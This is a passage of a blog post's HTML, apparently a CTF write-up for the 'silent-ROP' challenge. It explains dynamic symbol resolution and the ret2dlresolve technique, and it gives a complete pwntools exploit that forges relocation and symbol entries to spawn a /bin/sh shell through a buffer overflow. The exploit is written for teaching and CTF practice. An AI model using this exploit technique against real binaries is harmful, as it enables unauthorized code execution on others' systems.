+<p>but what if there is no value in the GOT due to lazy binding? here it comes dl resolve</p>
+<h3 id="dl-resolve"><a href="#dl-resolve" class="headerlink" title="dl resolve"></a>dl resolve</h3><ol>
+<li>if the GOT return 0x0, the the binary will use _dl_runtime_resolve() to find the real address</li>
+<li>after getting the real address, it will save the real address to GOT</li>
+<li>call the function with parameter.</li>
+</ol>
+<p><code>_dl_runtime_resolve</code> function is called in front of section.plt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">;-- section..plt:</span><br><span class="line">;-- .plt:</span><br><span class="line">0x08049030      push dword [0x804c004] ; 0x804c004 is link_map</span><br><span class="line">0x08049036      jmp dword [0x804c008] ; 0x804c008 is the address of _dl_runtime_resolve</span><br><span class="line">0x0804903c      nop dword [eax]</span><br><span class="line">0x08049040      endbr32</span><br><span class="line">0x08049044      push 0</span><br><span class="line">0x08049049      jmp section..plt</span><br><span class="line">0x0804904e      nop</span><br></pre></td></tr></table></figure>
+
+<p><code>_dl_runtime_resolve</code> do the following things</p>
+<ol>
+<li>it take link_map which store the all information of imported library</li>
+<li>it also take rel_offset, which indicate the offset of struct of <code>Elf32_Rel</code> to .rel.plt</li>
+<li>then it read the <code>r_info</code> in <code>Elf32_Rel</code></li>
+<li>use <code>r_info</code> to find <code>Elf32_Sym</code></li>
+<li>use <code>Elf32_Sym</code> struct to find function name</li>
+<li>search by function name and then return real function address</li>
+<li>call the function by it&#39;s paramter</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve(link_map, rel_offset) &#123;</span><br><span class="line">    Elf32_Rel * rel_entry = JMPREL + rel_offset ;</span><br><span class="line">    Elf32_Sym * sym_entry = &amp;SYMTAB [ ELF32_R_SYM ( rel_entry -&gt; r_info )];</span><br><span class="line">    char * sym_name = STRTAB + sym_entry -&gt; st_name ;</span><br><span class="line">    _search_for_symbol_(link_map, sym_name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x2-How-return-to-dl-resolve-work"><a href="#0x2-How-return-to-dl-resolve-work" class="headerlink" title="0x2 How return to dl-resolve work"></a>0x2 How return to dl-resolve work</h1><p>notice that in <code>_dl_runtime_resolve</code>, it use <code>rel_offset</code> to find the struct of <code>Elf32_Rel</code> and get the function name.</p>
+<p>also notice that the boundary check for <code>rel_offset</code> is missing, so we an pass any value to the function</p>
+<p>if we can find a writable address that higher than JMPREL, we can try to make a fake <code>Elf32_Rel</code> struct in fake <code>section.rel.plt</code> along with fake <code>section.dynsym</code> and fake <code>section.dynstr</code></p>
+<p>after making those fake section, pass the section address offset to <code>_dl_runtime_resolve</code>, then <code>_dl_runtime_resolve</code> will automatically call the function.</p>
+<h1 id="0x4-Example-Solution"><a href="#0x4-Example-Solution" class="headerlink" title="0x4 Example Solution"></a>0x4 Example Solution</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Arch:     i386-32-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>the binary have an very obvious buffer overflow in <code>vuln</code>, so we can easily write ebp and eip</li>
+<li>first we need to use <code>read</code> to create our fake section and ropchian to call dl_resolve</li>
+<li>we want to fake the main to call read(0,fake_stack_address,0x300)</li>
+<li>after creating fake stack, we want point esp to our fake stack and use ret to execute dl_resolve, there fore, we use leave;ret<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fake_stack_address &lt;- saved ebp</span><br><span class="line">jmp read &lt;- call read</span><br><span class="line">leave;ret; &lt;- saved eip. but we want to first point esp to the our stack and then ret so we can execute dl_resolve</span><br><span class="line">0x0 &lt;- para 1</span><br><span class="line">fake_stack_address &lt;- para 2</span><br><span class="line">fake_stack_length=0x300 &lt; para 3</span><br><span class="line">main stack</span><br></pre></td></tr></table></figure></li>
+<li>then, in the stack we need to forge all the section we need and create rop chain<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">AAAA &lt;- fake ebp</span><br><span class="line">// we want to fake that system call dl_resolve</span><br><span class="line">// push fake section.rel.plt</span><br><span class="line">dl_resolve</span><br><span class="line">fake_rel_plt_ptr</span><br><span class="line">AAAA &lt;- fake eip</span><br><span class="line">&quot;/bin/sh&quot; ptr &lt;- parameter 1</span><br><span class="line">// some fake stack where it call system(&quot;/bin/sh&quot;)</span><br><span class="line"></span><br><span class="line">-</span><br><span class="line"></span><br><span class="line">// fake section.rel.plt</span><br><span class="line">&#123;</span><br><span class="line">   Elf32_Addr r_offset ; /* Address */  Fake got</span><br><span class="line">   Elf32_Word r_info ; /* Relocation type and symbol index */  point to fake section.dynsym</span><br><span class="line">&#125;</span><br><span class="line">// fake section.dynsym</span><br><span class="line">point to &quot;system&quot; in fake section.dynstr</span><br><span class="line">// fake section.dynstr</span><br><span class="line">&quot;system&quot;</span><br><span class="line">// fake got</span><br><span class="line">// fake text</span><br><span class="line">&quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="0x5-Example-Exploits"><a href="#0x5-Example-Exploits" class="headerlink" title="0x5 Example Exploits"></a>0x5 Example Exploits</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># This exploit template was generated via:</span></span><br><span class="line"><span class="comment"># $ pwn template silent-ROP</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = context.binary = ELF(<span class="string">&#x27;silent-ROP&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">rop = ROP(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Many built-in settings can be controlled on the command-line and show up</span></span><br><span class="line"><span class="comment"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span></span><br><span class="line"><span class="comment"># for all created processes...</span></span><br><span class="line"><span class="comment"># ./exploit.py DEBUG NOASLR</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Specify your GDB script here for debugging</span></span><br><span class="line"><span class="comment"># GDB will be launched if the exploit is run via e.g.</span></span><br><span class="line"><span class="comment"># ./exploit.py GDB</span></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">tbreak main</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment"># ===========================================================</span></span><br><span class="line"><span class="comment"># Arch:     i386-32-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    No canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x8048000)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x08048000 - 0x08049000 - usr     4K s r-- /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; segment.ehdr</span></span><br><span class="line"><span class="comment"># 0x08049000 - 0x0804a000 - usr     4K s r-x /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; map._home_aynakeya_ctf_k3rn3lctf2021_silent_rop_silent_ROP.r_x</span></span><br><span class="line"><span class="comment"># 0x0804a000 - 0x0804b000 - usr     4K s r-- /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; obj._fp_hw</span></span><br><span class="line"><span class="comment"># 0x0804b000 - 0x0804c000 - usr     4K s r-- /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; map._home_aynakeya_ctf_k3rn3lctf2021_silent_rop_silent_ROP.r__</span></span><br><span class="line"><span class="comment"># 0x0804c000 - 0x0804d000 - usr     4K s rw- /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; map._home_aynakeya_ctf_k3rn3lctf2021_silent_rop_silent_ROP.rw_</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [0xf7ef7120]&gt; px @ 0x8048248</span></span><br><span class="line"><span class="comment"># - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF</span></span><br><span class="line"><span class="comment"># 0x08048248  0000 0000 0000 0000 0000 0000 0000 0000  ................</span></span><br><span class="line"><span class="comment"># 0x08048258  2000 0000 0000 0000 0000 0000 1200 0000   ...............</span></span><br><span class="line"><span class="comment"># 0x08048268  5000 0000 0000 0000 0000 0000 2000 0000  P........... ...</span></span><br><span class="line"><span class="comment"># 0x08048278  3400 0000 0000 0000 0000 0000 1200 0000  4...............</span></span><br><span class="line"><span class="comment"># 0x08048288  1a00 0000 0000 0000 0000 0000 1100 0000  ................</span></span><br><span class="line"><span class="comment"># 0x08048298  2c00 0000 0000 0000 0000 0000 1200 0000  ,...............</span></span><br><span class="line"><span class="comment"># 0x080482a8  2500 0000 0000 0000 0000 0000 1100 0000  %...............</span></span><br><span class="line"><span class="comment"># 0x080482b8  0b00 0000 04a0 0408 0400 0000 1100 1100  ................</span></span><br><span class="line"><span class="comment"># 0x080482c8  006c 6962 632e 736f 2e36 005f 494f 5f73  .libc.so.6._IO_s</span></span><br><span class="line"><span class="comment"># 0x080482d8  7464 696e 5f75 7365 6400 7374 6469 6e00  tdin_used.stdin.</span></span><br><span class="line"><span class="comment"># 0x080482e8  7265 6164 0073 7464 6f75 7400 7365 7476  read.stdout.setv</span></span><br><span class="line"><span class="comment"># 0x080482f8  6275 6600 5f5f 6c69 6263 5f73 7461 7274  buf.__libc_start</span></span><br><span class="line"><span class="comment"># 0x08048308  5f6d 6169 6e00 474c 4942 435f 322e 3000  _main.GLIBC_2.0.</span></span><br><span class="line"><span class="comment"># 0x08048318  5f5f 676d 6f6e 5f73 7461 7274 5f5f 0000  __gmon_start__..</span></span><br><span class="line"><span class="comment"># 0x08048328  0000 0200 0000 0200 0200 0200 0200 0100  ................</span></span><br><span class="line"><span class="comment"># 0x08048338  0100 0100 0100 0000 1000 0000 0000 0000  ................</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log_print</span>(<span class="params">*msg</span>):</span><br><span class="line">    log.info(<span class="string">&quot; &quot;</span>.join(msg))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int2byte</span>(<span class="params">x: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">return</span> x.to_bytes(<span class="number">0x4</span>, <span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># at the beginning of .plt</span></span><br><span class="line">dl_resolve_ptr = exe.get_section_by_name(<span class="string">&quot;.plt&quot;</span>)[<span class="string">&quot;sh_addr&quot;</span>]</span><br><span class="line">log_print(<span class="string">&quot;dl_resolve:&quot;</span>, <span class="built_in">hex</span>(dl_resolve_ptr))</span><br><span class="line"></span><br><span class="line">section_dynstr, section_dynsym, section_rel_plt = <span class="built_in">map</span>(exe.dynamic_value_by_tag,</span><br><span class="line">                                                      [<span class="string">&quot;DT_STRTAB&quot;</span>, <span class="string">&quot;DT_SYMTAB&quot;</span>, <span class="string">&quot;DT_JMPREL&quot;</span>])</span><br><span class="line"></span><br><span class="line">log_print(<span class="string">&quot;.dynstr:&quot;</span>, <span class="built_in">hex</span>(section_dynstr))</span><br><span class="line">log_print(<span class="string">&quot;.dynsym:&quot;</span>, <span class="built_in">hex</span>(section_dynsym))</span><br><span class="line">log_print(<span class="string">&quot;.rel.plt:&quot;</span>, <span class="built_in">hex</span>(section_rel_plt))</span><br><span class="line"></span><br><span class="line">writable_ptr = <span class="number">0x0804d000</span> - <span class="number">0x400</span></span><br><span class="line">fake_stack_address = writable_ptr</span><br><span class="line">rop_offset = <span class="number">0x0</span></span><br><span class="line">fake_rel_plt_offset = <span class="number">0x140</span></span><br><span class="line">fake_dynsym_offset = <span class="number">0x160</span> + section_dynsym % <span class="number">0x10</span>  <span class="comment"># align to 0x10 multiplication + section_dynsym</span></span><br><span class="line">fake_dynstr_offset = <span class="number">0x190</span></span><br><span class="line">fake_got_offset = <span class="number">0x1e0</span></span><br><span class="line">fake_text_offset = <span class="number">0x1f0</span></span><br><span class="line">fake_stack_length = <span class="number">0x300</span></span><br><span class="line"><span class="comment"># fake section.text</span></span><br><span class="line">fake_text = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"><span class="comment"># fake section.dynstr</span></span><br><span class="line">fake_dynstr = <span class="string">b&quot;system\x00&quot;</span></span><br><span class="line"><span class="comment"># fake section.dynsym</span></span><br><span class="line">fake_dynsym = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: (writable_ptr + fake_dynstr_offset) - section_dynstr,  <span class="comment"># system\x00 offset to section.dynstr</span></span><br><span class="line">    <span class="number">0xc</span>: <span class="number">0x12</span>  <span class="comment"># just copy paste from origin section.dynsym</span></span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>, length=<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">fake_sym_index = (writable_ptr + fake_dynsym_offset - section_dynsym) // <span class="number">0x10</span></span><br><span class="line">log_print(<span class="built_in">hex</span>(fake_sym_index))</span><br><span class="line">r_info = (fake_sym_index &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">log_print(<span class="built_in">hex</span>(r_info))</span><br><span class="line">fake_rel_plt = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: writable_ptr + fake_got_offset,</span><br><span class="line">    <span class="number">0x4</span>: r_info,</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>, length=<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">call_dl_resolve = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: [</span><br><span class="line">        <span class="string">b&quot;AAAA&quot;</span>, <span class="comment"># fake ebp</span></span><br><span class="line">        dl_resolve_ptr,</span><br><span class="line">        (writable_ptr + fake_rel_plt_offset) - section_rel_plt,  <span class="comment"># section.rel.plt function offset</span></span><br><span class="line">        <span class="string">b&quot;AAAA&quot;</span>,</span><br><span class="line">        writable_ptr + fake_text_offset</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line">log_print(<span class="built_in">hex</span>((writable_ptr + fake_rel_plt_offset)), <span class="built_in">hex</span>(section_rel_plt),<span class="built_in">hex</span>((writable_ptr + fake_rel_plt_offset) - section_rel_plt))</span><br><span class="line"></span><br><span class="line">fake_call_system_stack = flat(&#123;</span><br><span class="line">    rop_offset: call_dl_resolve,</span><br><span class="line">    fake_rel_plt_offset: fake_rel_plt,</span><br><span class="line">    fake_dynsym_offset: fake_dynsym,</span><br><span class="line">    fake_dynstr_offset: fake_dynstr,</span><br><span class="line">    fake_text_offset: fake_text,</span><br><span class="line">&#125;,filler=<span class="string">b&quot;\x00&quot;</span>,length=fake_stack_length)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x0804c100</span></span><br><span class="line"><span class="string">AAAA &lt;- fake ebp</span></span><br><span class="line"><span class="string">// we want to fake that system call dl_resolve</span></span><br><span class="line"><span class="string">// push fake section.rel.plt</span></span><br><span class="line"><span class="string">dl_resolve</span></span><br><span class="line"><span class="string">fake_rel_plt_ptr</span></span><br><span class="line"><span class="string">-</span></span><br><span class="line"><span class="string">AAAA &lt;- fake eip</span></span><br><span class="line"><span class="string">&quot;/bin/sh&quot; ptr &lt;- parameter 1</span></span><br><span class="line"><span class="string">// some fake stack where it call system(&quot;/bin/sh&quot;)</span></span><br><span class="line"><span class="string">-</span></span><br><span class="line"><span class="string">// fake section.rel.plt</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">   Elf32_Addr r_offset ; /* Address */  Fake got</span></span><br><span class="line"><span class="string">   Elf32_Word r_info ; /* Relocation type and symbol index */  point to fake section.dynsym</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">// fake section.dynsym</span></span><br><span class="line"><span class="string">point to &quot;system&quot; in fake section.dynstr</span></span><br><span class="line"><span class="string">// fake section.dynstr</span></span><br><span class="line"><span class="string">&quot;system&quot;</span></span><br><span class="line"><span class="string">// fake got</span></span><br><span class="line"><span class="string">// fake text</span></span><br><span class="line"><span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">jump_to_call_system_stack = flat(&#123;</span><br><span class="line">    <span class="number">0x18</span>: [</span><br><span class="line">        fake_stack_address, <span class="comment"># ebp</span></span><br><span class="line">        exe.plt[<span class="string">&#x27;read&#x27;</span>], <span class="comment"># call read to write stack into the target</span></span><br><span class="line">        rop.find_gadget([<span class="string">&#x27;leave&#x27;</span>, <span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>],</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        fake_stack_address,</span><br><span class="line">        fake_stack_length,</span><br><span class="line">        ],</span><br><span class="line">    &#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">origin</span></span><br><span class="line"><span class="string">saved ebp</span></span><br><span class="line"><span class="string">save eip</span></span><br><span class="line"><span class="string">stack of main</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">we want to fake the main to call read(0,fake_stack_address,0x300),</span></span><br><span class="line"><span class="string">fake_stack_address &lt;- saved ebp</span></span><br><span class="line"><span class="string">jmp read &lt;- </span></span><br><span class="line"><span class="string">leave;ret; &lt;- saved eip. but we want to first point esp to the our stack and then ret so we can execute dl_resolve</span></span><br><span class="line"><span class="string">0x0 &lt;- para 1</span></span><br><span class="line"><span class="string">fake_stack_address &lt;- para 2</span></span><br><span class="line"><span class="string">fake_stack_length=0x300 &lt; para 3</span></span><br><span class="line"><span class="string">main</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&quot;debugger?&quot;</span>) == <span class="string">&quot;y\n&quot;</span>:</span><br><span class="line">    pid = util.proc.pidof(io)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The pid is: &quot;</span> + <span class="built_in">str</span>(pid))</span><br><span class="line">    util.proc.wait_for_debugger(pid)</span><br><span class="line">    <span class="built_in">input</span>(<span class="string">&quot;press enter to continue&quot;</span>)</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;send first payload&quot;</span>)</span><br><span class="line">io.sendline(jump_to_call_system_stack)</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;send second payload&quot;</span>)</span><br><span class="line">io.sendline(fake_call_system_stack)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x6-Flag"><a href="#0x6-Flag" class="headerlink" title="0x6 Flag"></a>0x6 Flag</h1><p>flag{r3t_2_dl_r3s0lve_d03s_n0t_n3ed_a_l34k}</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+              <a href="/tags/ret2dlresolve/" rel="tag"># ret2dlresolve</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/10/18/debugging-binary-with-pwntools-and-radare2/" rel="prev" title="Debugging binary with pwntools and radare2">
+                  <i class="fa fa-chevron-left"></i> Debugging binary with pwntools and radare2
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/11/20/ctf/writable-memory-section-before-init-and-after-init/" rel="next" title="Writable memory section before init and after init">
+                  Writable memory section before init and after init <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Aynakeya</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
